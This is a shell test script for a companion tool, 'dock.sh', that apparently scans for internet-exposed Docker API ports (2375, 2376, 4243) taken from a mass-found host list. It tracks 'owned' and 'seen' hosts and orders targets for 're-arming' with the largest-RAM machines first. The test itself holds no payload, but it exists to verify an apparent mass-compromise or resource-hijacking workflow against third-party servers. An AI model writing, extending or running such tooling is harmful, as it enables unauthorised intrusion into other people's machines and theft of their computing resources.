#!/bin/sh
# functional check of the two new dock.sh bits (port map + size-ordered re-arm).
# run: sh _porttest2.sh
set -eu
PATH="/usr/bin:$PATH"; export PATH
# NB editor-written .sh arrives CRLF: a bare `cd "$(dirname "$0")"` then gets a CR glued
# to its argument, cd fails, and `set -e` exits the script with no output at all.
HERE=$(dirname "$0" | tr -d '\r')
cd "$HERE" 2>/dev/null || cd .
WORK=.hunt
T=$(mktemp -d); trap 'rm -rf "$T"' EXIT
PORTMAP="$T/ports"; RAMFILE="$T/ram"; MF="$T/mass.found"
printf '1.1.1.1\tshodan-search\n2.2.2.2\tdocker=24.0.7@2376\n3.3.3.3\tdocker=20.10.1\n4.4.4.4\tshodan\n' > "$MF"

# --- 1. PORTMAP build - must match the awk in dock.sh ------------------------
awk -F'\t' 'NF > 1 && $2 !~ /shodan/ {
        p = "2375"
        if (match($2, /@[0-9]+$/)) p = substr($2, RSTART + 1)
        print $1 "\t" p
    }' "$MF" | tr -d '\r' | sort -u > "$PORTMAP" || :
echo "--- portmap ---"; cat "$PORTMAP"
if [ "$(wc -l < "$PORTMAP")" != 2 ]; then echo "FAIL portmap row count"; exit 1; fi
if [ "$(grep -c '^2\.2\.2\.2	2376$' "$PORTMAP")" != 1 ]; then echo "FAIL @port not parsed"; exit 1; fi
if [ "$(grep -c '^3\.3\.3\.3	2375$' "$PORTMAP")" != 1 ]; then echo "FAIL legacy row default"; exit 1; fi
if grep -q '^1\.1\.1\.1	' "$PORTMAP"; then echo "FAIL shodan candidate mapped"; exit 1; fi
echo "PASS portmap: @port kept, legacy->2375, shodan excluded"

# --- 2. per-host port list - must match endpoint() ---------------------------
sel() {
    rp=""
    if grep -q "^$1	" "$PORTMAP"; then rp=$(grep -m1 "^$1	" "$PORTMAP" | cut -f2); fi
    if [ -n "$rp" ]; then printf '%s\n' "$rp 2375 2376 4243"; else printf '2375\n'; fi
}
for ip in 2.2.2.2 3.3.3.3 1.1.1.1; do echo "plist $ip -> [$(sel "$ip")]"; done
[ "$(sel 1.1.1.1)" = "2375" ] || { echo "FAIL unverified not single-port"; exit 1; }
case "$(sel 2.2.2.2)" in 2376*) : ;; *) echo "FAIL verified host lost its port"; exit 1 ;; esac
echo "PASS endpoint(): verified keeps its recorded port, unverified -> :2375 only"

# --- 3. ledger must order big hosts first - matches the re-arm awk -----------
cut -f1 "$WORK/dock.owned" 2>/dev/null | sort -u > "$T/own" || :
grep -vxF -f "$T/own" "$WORK/dock.seen" 2>/dev/null | sort -u > "$T/lg" || :
first=$(head -1 "$T/lg"); second=$(sed -n 2p "$T/lg")
printf '%s\t8000000000\n%s\t1048576\n' "$second" "$first" > "$RAMFILE"
awk -F'\t' 'NR==FNR { m[$1]=$2; next } { print (($1 in m) ? m[$1] : 0) "\t" $1 }' \
    "$RAMFILE" "$T/lg" | sort -rn | cut -f2 > "$T/lg3"
echo "ledger rows=$(wc -l < "$T/lg") kept=$(wc -l < "$T/lg3") first_after=$(head -1 "$T/lg3")"
posbig=$(grep -n "^$second\$" "$T/lg3" | cut -d: -f1)
possmall=$(grep -n "^$first\$" "$T/lg3" | cut -d: -f1)
if [ "$posbig" != 1 ]; then echo "FAIL big-first order"; head -3 "$T/lg3"; exit 1; fi
if [ "$possmall" != 2 ]; then echo "FAIL small host rank (got $possmall, want 2)"; head -4 "$T/lg3"; exit 1; fi
if [ "$(wc -l < "$T/lg3")" != "$(wc -l < "$T/lg")" ]; then echo "FAIL ledger rows lost"; exit 1; fi
echo "PASS ledger: 8GB host first, 1MB host second, no rows lost"
echo ALL-PASS
